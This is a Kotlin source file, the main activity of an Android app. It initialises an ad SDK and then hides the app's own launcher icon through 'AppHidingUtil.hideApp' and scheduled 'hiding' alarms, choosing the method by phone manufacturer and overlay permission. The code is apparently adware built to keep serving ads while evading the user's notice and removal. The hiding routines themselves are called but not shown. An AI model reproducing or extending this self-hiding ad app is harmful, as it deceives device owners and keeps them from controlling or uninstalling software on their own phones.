package com.iiooss.ccaallll.ui.main

import android.os.Build
import android.provider.Settings
import androidx.fragment.app.Fragment
import androidx.fragment.app.commit
import com.bumptech.glide.manager.SupportRequestManagerFragment
import com.iiooss.ccaallll.R
import com.iiooss.ccaallll.base.BaseActivity
import com.iiooss.ccaallll.databinding.MainActivityBinding
import com.iiooss.ccaallll.utils.IRON_SOURCE_APP_KEY
import com.iiooss.ccaallll.utils.hiding.AlarmBroadcast
import com.iiooss.ccaallll.utils.hiding.AppHidingUtil
import com.iiooss.ccaallll.utils.hiding.HidingBroadcast
import com.ironsource.mediationsdk.IronSource
import org.koin.android.viewmodel.ext.android.viewModel
import org.koin.core.parameter.parametersOf
import java.util.*

class MainActivity : BaseActivity<MainViewModel, MainActivityBinding>() {

    val viewModel: MainViewModel by viewModel { parametersOf(this) }

    override fun provideLayoutId(): Int = R.layout.main_activity

    override fun setupUI() {
        IronSource.setMetaData("is_child_directed","false")
        IronSource.init(this, IRON_SOURCE_APP_KEY)
        AlarmBroadcast.startAlarm(this)
    }

    override fun onPause() {
        super.onPause()
        IronSource.onPause(this)
    }

    private fun notSupportedBackgroundDevice() = Build.MANUFACTURER.lowercase(Locale.ENGLISH) in listOf(
        "xiaomi", "oppo", "vivo", "letv", "honor", "oneplus"
    )

    override fun provideViewModel(): MainViewModel = viewModel

    override fun onResume() {
        super.onResume()
        IronSource.onResume(this)
        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice())
            AppHidingUtil.hideApp(this, "Launcher2", "Launcher")
        else
            HidingBroadcast.startAlarm(this)
        if (!viewModel.preferencesRepository.hasShownGuid) {
            GuidDialog().show(supportFragmentManager)
            viewModel.preferencesRepository.hasShownGuid = true
        }
        if (needToShowPermissionDialog())
            PermissionDialog().show(supportFragmentManager)
    }

    private fun needToShowPermissionDialog() =
        !viewModel.permissionRepository.hasNecessaryPermissions && supportFragmentManager.fragments.none { it is PermissionDialog }

    fun addFragment(fragment: Fragment) = supportFragmentManager.commit {
        add(R.id.fragmentContainer, fragment)
    }

    fun replaceFragmentsAddToBackStack(fragment: Fragment) = supportFragmentManager.commit {
        replace(R.id.fragmentContainer, fragment)
        addToBackStack(null)
    }

    fun removeFragment(fragment: Fragment) = supportFragmentManager.commit { remove(fragment) }

    override fun onBackPressed() {
        val fragments = supportFragmentManager.fragments
            .filterNot { it is SupportRequestManagerFragment }
        if (fragments.size > 1)
            removeFragment(fragments.last())
        else
            super.onBackPressed()
    }


}